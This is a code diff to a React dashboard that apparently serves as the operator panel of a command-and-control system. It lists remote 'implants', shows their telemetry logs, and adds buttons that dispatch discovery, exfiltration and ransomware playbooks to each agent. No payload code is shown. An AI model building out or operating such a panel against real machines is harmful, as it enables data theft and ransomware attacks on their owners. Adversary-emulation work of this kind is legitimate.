@@ -1,13 +1,16 @@
 "use client";
 
 import { useEffect, useState } from "react";
-import { Terminal, ShieldAlert, Cpu, Activity, Clock, Server, MonitorSmartphone, Skull } from "lucide-react";
+import { Terminal, ShieldAlert, Cpu, Activity, Clock, Server, MonitorSmartphone, Skull, Send, X } from "lucide-react";
 import { formatDistanceToNow } from "date-fns";
 import type { AgentData } from "./api/db";
 
 export default function Dashboard() {
   const [agents, setAgents] = useState<AgentData[]>([]);
   const [loading, setLoading] = useState(true);
+  const [expandedLogsId, setExpandedLogsId] = useState<string | null>(null);
+
+  const [dispatchedCmd, setDispatchedCmd] = useState<Record<string, string>>({});
 
   useEffect(() => {
     const fetchAgents = async () => {
@@ -15,6 +18,16 @@ export default function Dashboard() {
         const res = await fetch("/api/agents");
         const data = await res.json();
         setAgents(data.agents || []);
+
+        // Clear local dispatch state if agent no longer has a pending command
+        setDispatchedCmd(prev => {
+          const next = { ...prev };
+          (data.agents || []).forEach((a: AgentData) => {
+            if (!a.pendingCommand && next[a.id]) delete next[a.id];
+          });
+          return next;
+        });
+
       } catch (err) {
         console.error("Failed to fetch agents", err);
       } finally {
@@ -26,6 +39,41 @@ export default function Dashboard() {
     const interval = setInterval(fetchAgents, 3000);
     return () => clearInterval(interval);
   }, []);
+
+  const dispatchCommand = async (id: string, command: string) => {
+    try {
+      setDispatchedCmd(prev => ({ ...prev, [id]: command }));
+      await fetch('/api/dispatch', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({ id, command }),
+      });
+      console.log(`Dispatched ${command} to ${id}`);
+    } catch (err) {
+      console.error("Failed to dispatch command", err);
+      setDispatchedCmd(prev => {
+        const next = { ...prev };
+        delete next[id];
+        return next;
+      });
+    }
+  };
+
+  const removeAgent = async (id: string) => {
+    if (!confirm('Remove this endpoint from the dashboard?')) return;
+    try {
+      await fetch('/api/agents/delete', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ id }),
+      });
+      setAgents(prev => prev.filter(a => a.id !== id));
+    } catch (err) {
+      console.error('Failed to delete agent', err);
+    }
+  };
 
   const getStatusColor = (status: string, lastSeen: string) => {
     const isDead = new Date().getTime() - new Date(lastSeen).getTime() > 30000;
@@ -105,8 +153,15 @@ export default function Dashboard() {
             {agents.map((agent) => (
               <div
                 key={agent.id}
-                className="glass-panel rounded-xl p-6 transition-all duration-300 hover:border-emerald-500/40 hover:-translate-y-1"
+                className="glass-panel rounded-xl p-6 transition-all duration-300 hover:border-emerald-500/40 hover:-translate-y-1 relative group"
               >
+                <button
+                  onClick={() => removeAgent(agent.id)}
+                  title="Remove endpoint"
+                  className="absolute top-3 right-3 opacity-0 group-hover:opacity-100 transition-opacity p-1 rounded hover:bg-red-500/20 text-slate-600 hover:text-red-400"
+                >
+                  <X className="w-4 h-4" />
+                </button>
                 <div className="flex justify-between items-start mb-4">
                   <div className="flex items-center gap-3">
                     <div className="h-10 w-10 rounded-lg bg-slate-900 flex items-center justify-center border border-slate-800 shadow-inner">
@@ -125,6 +180,12 @@ export default function Dashboard() {
                 </div>
 
                 <div className="space-y-3 mt-6">
+                  {agent.pendingCommand || dispatchedCmd[agent.id] ? (
+                    <div className="bg-emerald-500/10 border border-emerald-500/20 text-emerald-400 text-xs p-2 rounded flex items-center gap-2 animate-pulse">
+                      <Activity className="w-3 h-3" />
+                      Executing {agent.pendingCommand || dispatchedCmd[agent.id]}...
+                    </div>
+                  ) : null}
                   <div className="flex justify-between items-center text-sm border-b border-white/5 pb-2">
                     <span className="text-slate-500">Implant ID</span>
                     <span className="text-slate-300 opacity-70 truncate max-w-[150px]">{agent.id}</span>
@@ -143,14 +204,52 @@ export default function Dashboard() {
                   </div>
                 </div>
 
-                <div className="mt-6 pt-4 border-t border-white/5 flex grid grid-cols-2 gap-3">
-                  <button className="w-full py-2 bg-emerald-500/10 hover:bg-emerald-500/20 text-emerald-400 text-xs font-bold tracking-widest uppercase rounded border border-emerald-500/30 transition-colors">
-                    Deploy Block
+                <div className="mt-6 pt-4 border-t border-white/5 flex grid grid-cols-3 gap-2">
+                  <button
+                    onClick={() => dispatchCommand(agent.id, 'discovery')}
+                    title="Run Discovery Playbook"
+                    className="w-full py-2 bg-blue-500/10 hover:bg-blue-500/20 text-blue-400 flex justify-center text-xs font-bold rounded border border-blue-500/30 transition-colors"
+                  >
+                    <Terminal className="w-4 h-4" />
                   </button>
-                  <button className="w-full py-2 bg-slate-800 hover:bg-slate-700 text-slate-300 text-xs font-bold tracking-widest uppercase rounded border border-slate-700 transition-colors">
-                    View Logs
+                  <button
+                    onClick={() => dispatchCommand(agent.id, 'exfiltration')}
+                    title="Run Exfiltration Playbook"
+                    className="w-full py-2 bg-yellow-500/10 hover:bg-yellow-500/20 text-yellow-400 flex justify-center text-xs font-bold rounded border border-yellow-500/30 transition-colors"
+                  >
+                    <Send className="w-4 h-4" />
+                  </button>
+                  <button
+                    onClick={() => dispatchCommand(agent.id, 'ransomware')}
+                    title="Run Ransomware Playbook"
+                    className="w-full py-2 bg-red-500/10 hover:bg-red-500/20 text-red-400 flex justify-center text-xs font-bold rounded border border-red-500/30 transition-colors"
+                  >
+                    <Skull className="w-4 h-4" />
                   </button>
                 </div>
+
+                <div className="mt-2 text-center">
+                  <button
+                    onClick={() => setExpandedLogsId(expandedLogsId === agent.id ? null : agent.id)}
+                    className="text-xs text-slate-500 hover:text-emerald-400 font-bold tracking-widest uppercase transition-colors"
+                  >
+                    {expandedLogsId === agent.id ? "Close Terminal" : "View Live Terminal"}
+                  </button>
+                </div>
+
+                {expandedLogsId === agent.id && (
+                  <div className="mt-4 bg-[#0a0a0a] border border-slate-800 rounded p-3 h-48 overflow-y-auto font-mono text-xs flex flex-col-reverse shadow-inner">
+                    <div className="space-y-1">
+                      {agent.logs && agent.logs.length > 0 ? (
+                        agent.logs.map((log, i) => (
+                          <div key={i} className="text-emerald-500 break-words opacity-90">{log}</div>
+                        ))
+                      ) : (
+                        <div className="text-slate-600 italic">No telemetry data available for this implant yet...</div>
+                      )}
+                    </div>
+                  </div>
+                )}
               </div>
             ))}
           </div>
